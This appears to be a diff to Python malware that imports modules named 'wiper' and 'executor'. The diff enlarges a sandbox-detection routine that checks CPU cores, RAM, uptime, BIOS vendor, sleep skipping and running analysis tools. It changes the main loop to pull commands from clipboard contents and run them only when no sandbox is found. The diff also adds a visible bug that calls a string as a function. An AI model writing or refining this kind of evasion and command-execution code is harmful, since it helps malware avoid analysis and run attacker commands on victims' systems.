@@ -7,6 +7,7 @@ from wiper import *
 from executor import *
 import time
 from random import randint
+import subprocess
 
 
 def extract_commands(text):
@@ -19,64 +20,99 @@ def extract_commands(text):
 
     return commands
 
-
 def sandbox_check(verbose=False):
     suspicious = []
 
+    system = platform.system().lower()
+
+    def log(reason):
+        if verbose:
+            print(f"[!] Sandbox suspicion: {reason}")
+        suspicious.append(reason)
+
+    # CPU core check (only flag if 1 core)
     try:
-        with open("/proc/uptime") as f:
-            uptime = float(f.readline().split()[0])
-            if uptime < 300:
-                suspicious.append("Low uptime")
+        if os.cpu_count() == 1:
+            log("Single CPU core detected")
     except:
         pass
 
-    try:
-        if os.cpu_count() <= 2:
-            suspicious.append("Low CPU core count")
-    except:
-        pass
-
-    try:
-        if len(os.listdir("/proc")) < 50:
-            suspicious.append("Low process count")
-    except:
-        pass
-
-    try:
-        sandbox_tools = ["vbox", "vmware", "xen", "wireshark", "procmon", "sandbox", "fakenet", "ida", "olly"]
-        for proc in psutil.process_iter(['name']):
-            name = proc.info['name'].lower()
-            if any(tool in name for tool in sandbox_tools):
-                suspicious.append(f"Suspicious process: {name}")
-                break
-    except:
-        pass
-
+    # Sleep skip detection
     try:
         start = time.time()
         time.sleep(5)
         if time.time() - start < 4.5:
-            suspicious.append("Sleep skipped")
+            log("Sleep skipped (likely hooked)")
     except:
         pass
 
-    if verbose:
-        for reason in suspicious:
-            # print(f"[!] Sandbox suspicion: {reason}")
+    # Memory size check
+    try:
+        total_ram_gb = psutil.virtual_memory().total / (1024 ** 3)
+        if total_ram_gb < 2:
+            log(f"Low RAM: {total_ram_gb:.2f} GB")
+    except:
+        pass
+
+    # Suspicious processes
+    try:
+        sandbox_tools = ["vbox", "vmware", "xen", "wireshark", "procmon", "sandbox", "fakenet", "ida", "olly", "tcpview", "procexp"]
+        for proc in psutil.process_iter(['name']):
+            name = proc.info['name']
+            if name and any(tool in name.lower() for tool in sandbox_tools):
+                log(f"Suspicious process running: {name}")
+                break
+    except:
+        pass
+
+    # OS-specific checks
+    if system == "linux":
+        # Uptime
+        try:
+            with open("/proc/uptime") as f:
+                uptime = float(f.readline().split()[0])
+                if uptime < 120:
+                    log(f"Low uptime: {uptime} seconds")
+        except:
             pass
 
+        # Low process count
+        try:
+            if len(os.listdir("/proc")) < 30:
+                log("Low number of processes in /proc")
+        except:
+            pass
+
+        # BIOS check
+        try:
+            bios_vendor = open('/sys/class/dmi/id/bios_vendor').read().strip().lower()
+            if any(bad in bios_vendor for bad in ["qemu", "virtual", "vmware", "xen", "bochs"]):
+                log(f"Suspicious BIOS vendor: {bios_vendor}")
+        except:
+            pass
+
+    elif system == "windows":
+        # BIOS info
+        try:
+            bios_output = subprocess.check_output("wmic bios get manufacturer", shell=True).decode()
+            if any(bad in bios_output.lower() for bad in ["vmware", "virtual", "qemu", "bochs", "xen"]):
+                log(f"Suspicious BIOS manufacturer: {bios_output.strip()}")
+        except:
+            pass
+
+
     return len(suspicious) > 0
+
 
 
 def main():
     done_cmd = ""
 
     while True:
-        if sandbox_check(verbose=False):
+        if not sandbox_check(verbose=False):  # Only run if NOT in a sandbox
             clipboard_data = fetch_clipboard_data()
             print("Clipboard data: ", clipboard_data)
-            commands = extract_commands(clipboard_data)
+            commands = extract_commands(clipboard_data())
             print(commands)
 
             for command in commands:
@@ -92,6 +128,9 @@ def main():
                 time.sleep(randint(3, 10))
 
                 done_cmd = command
+        else:
+            time.sleep(randint(10, 60))
+
 
 
 if __name__ == '__main__':
